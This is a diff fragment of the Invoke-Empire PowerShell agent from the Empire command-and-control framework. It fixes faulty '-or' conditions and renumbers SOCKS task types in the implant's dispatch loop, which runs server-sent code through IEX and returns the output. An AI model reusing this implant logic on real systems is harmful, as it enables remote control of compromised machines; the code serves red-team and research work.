@@ -1046,24 +1046,24 @@ function Invoke-Empire {
             }
 
             # socks proxy server
-            elseif($type -eq 34) {
+            elseif($type -eq 60) {
                 Encode-Packet -type 0 -data '[!] SOCKS server not implemented' -ResultID $ResultID;
             }
 
             # socks proxy server data
-            elseif($type -eq 34) {
+            elseif($type -eq 61) {
                 Encode-Packet -type 0 -data '[!] SOCKS server data not implemented' -ResultID $ResultID;
             }
 
             # dynamic code execution, wait for output, don't save output
-            elseif($type -eq 100 -or 118) {
+            elseif($type -eq 100 -or $type -eq 118) {
                 $ResultData = IEX $data;
                 if($ResultData) {
                     Encode-Packet -type $type -data $ResultData -ResultID $ResultID;
                 }
             }
             # dynamic code execution, wait for output, save output
-            elseif($type -eq 101 -or 119) {
+            elseif($type -eq 101 -or $type -eq 119) {
                 # format- [15 chars of prefix][5 chars extension][data]
                 $prefix = $data.Substring(0,15);
                 $extension = $data.Substring(15,5);
@@ -1074,13 +1074,13 @@ function Invoke-Empire {
             }
 
             # dynamic code execution, no wait, don't save output
-            elseif($type -eq 110 -or 112) {
+            elseif($type -eq 110 -or $type -eq 112) {
                 $jobID = Start-AgentJob $data;
                 $script:ResultIDs[$jobID]=$resultID;
                 Encode-Packet -type $type -data ("Job started: " + $jobID) -ResultID $ResultID;
             }
             # dynamic code execution, no wait, save output
-            elseif($type -eq 111 -or 113) {
+            elseif($type -eq 111 -or $type -eq 113) {
                 Encode-Packet -type 0 -data '[!] Dynamic code execution, no wait, save output not implemented' -ResultID $ResultID;
 
                 # Write-Host "'dynamic code execution, no wait, save output' not implemented!"
